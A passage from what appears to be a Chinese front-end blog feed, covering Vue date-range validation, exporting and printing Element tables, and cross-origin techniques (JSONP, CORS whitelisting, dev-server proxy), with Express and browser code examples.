&#123;</span><br><span class="line">        startDate: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        stopDate: <span class="string">&#x27;&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      rules: &#123;</span><br><span class="line">        startDate: [&#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;请选择起始日期&#x27;</span>, <span class="attr">trigger</span>: <span class="string">&#x27;change&#x27;</span> &#125;],</span><br><span class="line">        stopDate: [&#123; <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">validator</span>: checkEndTime, <span class="attr">trigger</span>: <span class="string">&#x27;change&#x27;</span> &#125;]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    <span class="string">&#x27;form.startDate&#x27;</span>() &#123;</span><br><span class="line">      <span class="built_in">this</span>.validateReset([<span class="string">&#x27;startDate&#x27;</span>, <span class="string">&#x27;stopDate&#x27;</span>])</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;form.stopDate&#x27;</span>() &#123;</span><br><span class="line">      <span class="built_in">this</span>.validateReset([<span class="string">&#x27;startDate&#x27;</span>, <span class="string">&#x27;stopDate&#x27;</span>])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="function"><span class="title">validateReset</span>(<span class="params">arr</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.$refs[<span class="string">&#x27;form&#x27;</span>].validateField(arr)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">ValidatorEndTime</span>(<span class="params">rule, value, callback, start</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!value) &#123;</span><br><span class="line">        callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;请选择截止日期&#x27;</span>))</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!start) &#123;</span><br><span class="line">          callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;请选择起始日期！&#x27;</span>))</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">Date</span>.parse(start) &gt; <span class="built_in">Date</span>.parse(value)) &#123;</span><br><span class="line">          callback(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;截止日期必须大于起始日期！&#x27;</span>))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          callback()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;需求：&quot;&gt;&lt;a href=&quot;#需求：&quot; class=&quot;headerlink&quot; title=&quot;需求：&quot;&gt;&lt;/a&gt;需求：&lt;/h2&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;选择起始日期后截止日期不能小于起始日期&lt;/li&gt;
&lt;li&gt;选择截止日期后起始日期不能大于截止日期&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="问题" scheme="http://llmysnow.top/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Vue 把表格导出 Excel 文件及打印</title>
    <link href="http://llmysnow.top/posts/9fef765/"/>
    <id>http://llmysnow.top/posts/9fef765/</id>
    <published>2021-06-04T07:54:37.938Z</published>
    <updated>2021-06-04T07:55:33.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装文件"><a href="#安装文件" class="headerlink" title="安装文件"></a>安装文件</h2><ol><li><p>安装 <code>xlsx</code> 库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install xlsx</span><br></pre></td></tr></table></figure></li><li><p>安装 <code>file-saver</code> 库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install file-saver</span><br></pre></td></tr></table></figure></li><li><p>如果需要打印表格，安装 <code>vue-print-nb</code> 库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-print-nb</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%AF%BC%E5%87%BA%E6%89%93%E5%8D%B0.gif"></p><h2 id="导出表格"><a href="#导出表格" class="headerlink" title="导出表格"></a>导出表格</h2><p>主要使用的是 <code>js-xlsx</code>，导出 Excel 文件，主要是如何生成一个 sheet，之后将这个 sheet 转成最终 Excel 文件的 blob 对象，然后利用 <code>URL.createObject</code> 下载</p><ol><li><p>配置生成 Excel 的配置项</p><p><code>bookType</code> 要生成的文件类型</p><p><code>bookSST</code> 是否生成 <code>Shared String Table</code>，如果开启生成速度会下降，但在低版本 IOS 设备上有更好的兼容性</p><p><code>type</code> 可以使用 <code>base64</code> 、<code>binary</code> （BinaryString）、<code>string</code> （utf8 字符串）、<code>buffer</code>（node buffer） 、<code>array</code>（Unit8Array 8位无符号数组） 、<code>file</code> （文件路径，仅 node 支持）</p></li><li><p>字符串转 ArrayBuffer 进行文件下载，这里使用 <code>file-saver</code></p><p><code>FileSaver.saveAs(Blob/File/Url, filename)</code></p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> FileSaver <span class="keyword">from</span> <span class="string">&#x27;file-saver&#x27;</span></span><br><span class="line"><span class="keyword">import</span> XLSX <span class="keyword">from</span> <span class="string">&#x27;xlsx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlToExcel</span>(<span class="params">dom, title = <span class="string">&#x27;默认标题&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> wb = XLSX.utils.table_to_book(<span class="built_in">document</span>.querySelector(dom))</span><br><span class="line">  <span class="keyword">const</span> wbout = XLSX.write(wb, &#123; <span class="attr">bookType</span>: <span class="string">&#x27;xlsx&#x27;</span>, <span class="attr">bookSST</span>: <span class="literal">true</span>, <span class="attr">type</span>: <span class="string">&#x27;array&#x27;</span> &#125;)</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([wbout], &#123; <span class="attr">type</span>: <span class="string">&#x27;application/octet-stream&#x27;</span> &#125;)</span><br><span class="line">  FileSaver.saveAs(blob, <span class="string">`<span class="subst">$&#123;title&#125;</span>.xlsx`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>组件里使用。直接调用 <code>htmlToExcel</code> 方法，传入选择器和标题名称即可</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-table</span> <span class="attr">id</span>=<span class="string">&quot;printTest&quot;</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 500px&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;date&quot;</span> <span class="attr">label</span>=<span class="string">&quot;日期&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;age&quot;</span> <span class="attr">label</span>=<span class="string">&quot;年龄&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;success&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;htmlToExcel(&#x27;#printTest&#x27;, &#x27;表格&#x27;)&quot;</span>&gt;</span>导出Excel<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="打印表格"><a href="#打印表格" class="headerlink" title="打印表格"></a>打印表格</h2><p><code>main.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Print <span class="keyword">from</span> <span class="string">&#x27;vue-print-nb&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Print)</span><br></pre></td></tr></table></figure><p>组件里使。用 <code>v-print</code> 指定需要打印的容器，如下示例 <code>&quot;&#39;#printTest&#39;&quot;</code>：</p><ul><li>注意：选择器需要用单引号包裹</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">id</span>=<span class="string">&quot;printTest&quot;</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 500px&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;date&quot;</span> <span class="attr">label</span>=<span class="string">&quot;日期&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;age&quot;</span> <span class="attr">label</span>=<span class="string">&quot;年龄&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">v-print</span>=<span class="string">&quot;&#x27;#printTest&#x27;&quot;</span>&gt;</span>打印<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;安装文件&quot;&gt;&lt;a href=&quot;#安装文件&quot; class=&quot;headerlink&quot; title=&quot;安装文件&quot;&gt;&lt;/a&gt;安装文件&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装 &lt;code&gt;xlsx&lt;/code&gt; 库&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install xlsx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安装 &lt;code&gt;file-saver&lt;/code&gt; 库&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install file-saver&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果需要打印表格，安装 &lt;code&gt;vue-print-nb&lt;/code&gt; 库&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install vue-print-nb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="导出Excel" scheme="http://llmysnow.top/tags/%E5%AF%BC%E5%87%BAExcel/"/>
    
    <category term="打印" scheme="http://llmysnow.top/tags/%E6%89%93%E5%8D%B0/"/>
    
  </entry>
  
  <entry>
    <title>跨域常见的几种解决方案</title>
    <link href="http://llmysnow.top/posts/519525d/"/>
    <id>http://llmysnow.top/posts/519525d/</id>
    <published>2021-05-26T01:38:57.173Z</published>
    <updated>2021-06-04T07:56:41.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p><strong>非同源策略请求</strong>（比较协议、域名、端口号，只要有一个不一样就是跨域）：</p><ol><li>页面的访问地址（Web地址）</li><li>数据接口的请求地址</li></ol><a id="more"></a><p>情况1：开发时候是跨域的，但是服务器部署的时候是同源的</p><ul><li><p>修改本地 HOST【DNS解析】</p><p>核心：骗过浏览器，让浏览器认为是同源，但是本质还是跨域</p></li></ul><p>情况2：开发和上线都是跨域的</p><ul><li><p>JSONP（不安全，并且只支持GET请求）</p></li><li><p>其它方案</p><p><code>document.domain + iframe</code></p><p><code>window.name + iframe</code></p><p><code>H5 postMessage</code></p></li><li><p>CORS 跨域资源共享</p></li><li><p>proxy 跨域代理（目前最常用的）</p></li></ul><h2 id="JSONP-跨域资源请求"><a href="#JSONP-跨域资源请求" class="headerlink" title="JSONP 跨域资源请求"></a>JSONP 跨域资源请求</h2><p>利用<code>&lt;script&gt;</code> 或者<code>&lt;link&gt; &lt;img&gt; &lt;iframe&gt;...</code> 不存在域的限制</p><ul><li>特征：资源访问一定都是GET请求，不可能有POST</li></ul><p>全局函数 <code>function fn(result) &#123; ... &#125;</code></p><ol><li><code>&lt;script src=&#39;http://127.0.0.1:8888/user/list?callback=fn&#39;&gt;</code> 一定能发送到服务器（不存在域的限制），把全局函数 fn 名字，当做参数传递给服务器</li><li>服务器接收到这个请求，同时也可以获取 callback 传递的值（fn）</li><li>准备数据，最后返回给客户端 <code>fn([10,20,30])</code></li><li>客户端把函数 fn 执行，把服务器准备的数据作为实参传递给函数的形参</li></ol><h3 id="服务器代码"><a href="#服务器代码" class="headerlink" title="服务器代码"></a>服务器代码</h3><ul><li>首先看一下服务器代码，这里提供了 <code>jsonpTest</code> 这个资源路径，并返回给客户端 一个字符串（包含执行函数和参数）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">1001</span></span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`The Web Service Is Listening To The Port: <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/jsonpTest&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> fname = req.query.callback</span><br><span class="line">  <span class="keyword">let</span> data = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line">  res.send(<span class="string">`<span class="subst">$&#123;fname&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="JSONP-简单案例"><a href="#JSONP-简单案例" class="headerlink" title="JSONP 简单案例"></a>JSONP 简单案例</h3><ul><li>现在来尝试一下 jsonp 的一个简单案例</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">result</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(result)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:1001/jsonpTest?callback=func&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="封装-JSONP"><a href="#封装-JSONP" class="headerlink" title="封装 JSONP"></a>封装 JSONP</h3><ul><li>每次像简单案例那样调用太过麻烦，现在我们想像 Axios 那样调用 jsonp</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;node_modules/qs/dist/qs.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  jsonp(&#123;</span><br><span class="line"><span class="javascript">    url: <span class="string">&#x27;https://www.baidu.com/sugrec&#x27;</span>,</span></span><br><span class="line">    params: &#123;</span><br><span class="line">      prod: 0,</span><br><span class="line"><span class="javascript">      <span class="keyword">from</span>: <span class="string">&#x27;qq&#x27;</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    jsonpName: <span class="string">&#x27;callback&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(result)</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>实现代码如下：</p><p>当前还可以实现 Promise 版本，这里就不再实现了</p><p>可以参考：<a href="https://juejin.cn/post/6844904161985708046">面试中如何实现一个高质量的JSONP</a></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> jsonp = <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    config == <span class="literal">null</span> ? (config = &#123;&#125;) : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">typeof</span> config !== <span class="string">&#x27;object&#x27;</span> ? (config = &#123;&#125;) : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> &#123; url, params = &#123;&#125;, jsonpName = <span class="string">&#x27;callback&#x27;</span>, success = <span class="built_in">Function</span>.prototype &#125; = config</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自己创建一个全局函数</span></span><br><span class="line">    <span class="keyword">let</span> f_name = <span class="string">`jsonp<span class="subst">$&#123;+<span class="keyword">new</span> <span class="built_in">Date</span>()&#125;</span>`</span></span><br><span class="line">    <span class="built_in">window</span>[f_name] = <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">typeof</span> success === <span class="string">&#x27;function&#x27;</span> ? success(result) : <span class="literal">null</span></span><br><span class="line">      <span class="keyword">delete</span> <span class="built_in">window</span>[f_name]</span><br><span class="line">      <span class="built_in">document</span>.body.removeChild(script)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理URL</span></span><br><span class="line">    params = Qs.stringify(params)</span><br><span class="line">    <span class="keyword">if</span> (params) url += <span class="string">`<span class="subst">$&#123;url.includes(<span class="string">&#x27;?&#x27;</span>) ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;?&#x27;</span>&#125;</span><span class="subst">$&#123;params&#125;</span>`</span></span><br><span class="line">    url += <span class="string">`<span class="subst">$&#123;url.includes(<span class="string">&#x27;?&#x27;</span>) ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;?&#x27;</span>&#125;</span><span class="subst">$&#123;jsonpName&#125;</span>=<span class="subst">$&#123;f_name&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    script.src = url</span><br><span class="line">    <span class="comment">// script.onerror = () =&gt; &#123;&#125;;</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(script)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.jsonp = jsonp</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h3 id="其它网站-JSONP-案例"><a href="#其它网站-JSONP-案例" class="headerlink" title="其它网站 JSONP 案例"></a>其它网站 JSONP 案例</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  jsonp(&#123;</span><br><span class="line">    url: <span class="string">&#x27;https://www.baidu.com/sugrec&#x27;</span>,</span><br><span class="line">    params: &#123;</span><br><span class="line">      prod: <span class="string">&#x27;pc&#x27;</span>,</span><br><span class="line">      wd: <span class="string">&#x27;百度&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    jsonpName: <span class="string">&#x27;cb&#x27;</span>,</span><br><span class="line">    success: <span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS 跨域资源共享"></a>CORS 跨域资源共享</h2><p>在发送真实请求之前，浏览器会先发送一个试探性请求 OPTIONS（目的：测试客户端和服务器之间是否可以正常通信）如果可以正常通信，接下来再发送真实请求信息</p><h3 id="服务器代码-1"><a href="#服务器代码-1" class="headerlink" title="服务器代码"></a>服务器代码</h3><p><strong>Allow-Origin</strong> 可以设置的值</p><ul><li>单一源</li><li><code>*</code> 所有源（但是此时不安全，而且不允许携带资源凭证）</li></ul><p>假如你希望有多个源（不是所有源）都可以跨域，这时就需要<strong>设置一个白名单</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单</span></span><br><span class="line"><span class="keyword">const</span> safeList = [, <span class="string">&#x27;http://127.0.0.1:5500&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:5501&#x27;</span>]</span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> origin = req.headers.origin || req.headers.referer</span><br><span class="line">  origin = origin.replace(<span class="regexp">/\/$/</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (safeList.includes(origin)) &#123;</span><br><span class="line">    res.header(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, origin)</span><br><span class="line">    res.header(<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">    req.method === <span class="string">&#x27;OPTIONS&#x27;</span> ? res.send(<span class="string">&#x27;Current Services Support Domain Request!&#x27;</span>) : next()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.get(<span class="string">&#x27;/test&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.send(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  fetch(<span class="string">&#x27;http://127.0.0.1:1001/test&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(data))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Proxy-跨域代理"><a href="#Proxy-跨域代理" class="headerlink" title="Proxy 跨域代理"></a>Proxy 跨域代理</h2><p>爬虫：自己写一个后台，去爬取别的后台的数据（平台和平台之间没有跨域）</p><ul><li>后台和后台之间没有跨域限制（服务器一般会做白名单）</li><li>客户端和服务器才有跨域限制（浏览器的安全性）</li></ul><p>使用 <code>webpack devServer</code> 插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 